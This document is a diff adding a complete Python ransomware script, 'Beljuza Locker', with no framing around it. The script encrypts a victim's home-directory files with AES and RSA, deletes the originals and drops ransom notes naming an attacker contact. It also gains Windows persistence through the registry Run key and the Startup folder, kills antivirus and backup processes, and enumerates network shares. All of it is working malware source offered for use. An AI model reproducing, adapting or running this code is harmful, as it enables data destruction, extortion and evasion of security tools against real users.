@@ -1,0 +1,179 @@
+import os
+import sys
+import threading
+import random
+import string
+import shutil
+import subprocess
+import psutil
+from pathlib import Path
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives import serialization, hashes, padding as sym_padding
+from cryptography.hazmat.primitives.asymmetric import padding, rsa
+from cryptography.hazmat.backends import default_backend
+
+# === CONFIGURABLE PARAMETERS ===
+TARGET_EXTENSIONS = [
+    'doc', 'docx', 'pdf', 'jpg', 'png', 'txt', 'xlsx', 'zip', 'rar', 'csv', 'py', 'cpp'
+]
+RANSOM_EXTENSION = '.beljuza'
+RANSOM_NOTE = """
+---=== Beljuza Locker ===---
+Your important files have been encrypted!
+Contact: attacker@evilmail.com
+Victim ID: {victim_id}
+"""
+PUBLIC_KEY_PATH = 'public.pem'  # Path to attacker's RSA public key
+THREADS = 8
+
+# Known AV/backup process names to kill
+AV_PROCESSES = [
+    "MsMpEng.exe",    # Windows Defender
+    "avp.exe",        # Kaspersky
+    "mbam.exe",       # Malwarebytes
+    "veeam.exe",      # Veeam
+    "Backup.exe",     # Generic
+    # Add more if needed
+]
+
+def generate_victim_id(length=16):
+    """Generate a random victim ID."""
+    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
+
+def find_files(base_path, extensions):
+    """Recursively find files with given extensions."""
+    files_found = []
+    for root, dirs, files in os.walk(base_path):
+        for file in files:
+            if file.split('.')[-1].lower() in extensions:
+                files_found.append(os.path.join(root, file))
+    return files_found
+
+def generate_aes_key():
+    """Generate a random 32-byte AES key."""
+    return os.urandom(32)
+
+def encrypt_file(filepath, public_key):
+    """Encrypt file using AES-256, then encrypt AES key with RSA public key."""
+    aes_key = generate_aes_key()
+    iv = os.urandom(16)
+    try:
+        # Read file data
+        with open(filepath, 'rb') as f:
+            data = f.read()
+        # Pad and encrypt data
+        padder = sym_padding.PKCS7(128).padder()
+        padded_data = padder.update(data) + padder.finalize()
+        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
+        encryptor = cipher.encryptor()
+        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
+        # Encrypt AES key with RSA public key
+        encrypted_key = public_key.encrypt(
+            aes_key,
+            padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
+        )
+        # Save encrypted file: encrypted_key + iv + encrypted_data
+        with open(filepath + RANSOM_EXTENSION, 'wb') as f:
+            f.write(encrypted_key + iv + encrypted_data)
+        # Remove original file
+        os.remove(filepath)
+    except Exception as e:
+        print(f"Error encrypting {filepath}: {e}")
+
+def drop_ransom_note(folder, victim_id):
+    """Drop ransom note in the given folder if not already present."""
+    note_path = os.path.join(folder, 'BELJUZA_README.txt')
+    if not os.path.exists(note_path):
+        try:
+            with open(note_path, 'w') as f:
+                f.write(RANSOM_NOTE.format(victim_id=victim_id))
+        except Exception as e:
+            print(f"Error writing ransom note to {folder}: {e}")
+
+def add_to_startup(exe_path):
+    """Copy self to Windows startup (registry + folder)."""
+    try:
+        # Registry persistence
+        import winreg
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0,
+            winreg.KEY_SET_VALUE
+        )
+        winreg.SetValueEx(key, "Beljuza", 0, winreg.REG_SZ, exe_path)
+        winreg.CloseKey(key)
+    except Exception as e:
+        print(f"Registry persistence failed: {e}")
+    # Startup folder persistence
+    try:
+        startup_dir = os.path.join(
+            os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup'
+        )
+        if not os.path.exists(startup_dir):
+            os.makedirs(startup_dir)
+        shutil.copy2(exe_path, os.path.join(startup_dir, os.path.basename(exe_path)))
+    except Exception as e:
+        print(f"Startup folder persistence failed: {e}")
+
+def find_network_shares():
+    """List visible Windows network shares using 'net view'."""
+    try:
+        res = subprocess.check_output('net view', shell=True)
+        print("Network shares found:\n", res.decode())
+    except Exception as e:
+        print("Network scan failed:", e)
+
+def kill_av_processes():
+    """Kill common AV/backup processes by name."""
+    for proc in psutil.process_iter(['name']):
+        try:
+            if proc.info['name'] in AV_PROCESSES:
+                print(f"Killing process: {proc.info['name']}")
+                proc.kill()
+        except Exception:
+            continue
+
+def encrypt_worker(files, public_key, victim_id):
+    """Encrypt a list of files and drop ransom notes."""
+    for file in files:
+        encrypt_file(file, public_key)
+        drop_ransom_note(os.path.dirname(file), victim_id)
+
+def main(base_path):
+    """Main logic: load key, find files, run threads."""
+    # Load RSA public key
+    with open(PUBLIC_KEY_PATH, 'rb') as key_file:
+        public_key = serialization.load_pem_public_key(key_file.read(), backend=default_backend())
+    victim_id = generate_victim_id()
+    all_files = find_files(base_path, TARGET_EXTENSIONS)
+    random.shuffle(all_files)
+    # Split files among threads
+    chunks = [all_files[i::THREADS] for i in range(THREADS)]
+    threads = []
+    for chunk in chunks:
+        t = threading.Thread(target=encrypt_worker, args=(chunk, public_key, victim_id))
+        t.start()
+        threads.append(t)
+    for t in threads:
+        t.join()
+
+if __name__ == "__main__":
+    # 1. Persistence (Windows only)
+    if os.name == 'nt':
+        try:
+            add_to_startup(sys.executable)
+        except Exception as e:
+            print(f"Persistence error: {e}")
+    # 2. Kill AV/backup processes
+    try:
+        kill_av_processes()
+    except Exception as e:
+        print(f"Process killing error: {e}")
+    # 3. Network discovery (prints shares)
+    try:
+        find_network_shares()
+    except Exception as e:
+        print(f"Network discovery error: {e}")
+    # 4. Encrypt files (user's home directory)
+    main(os.path.expanduser("~"))
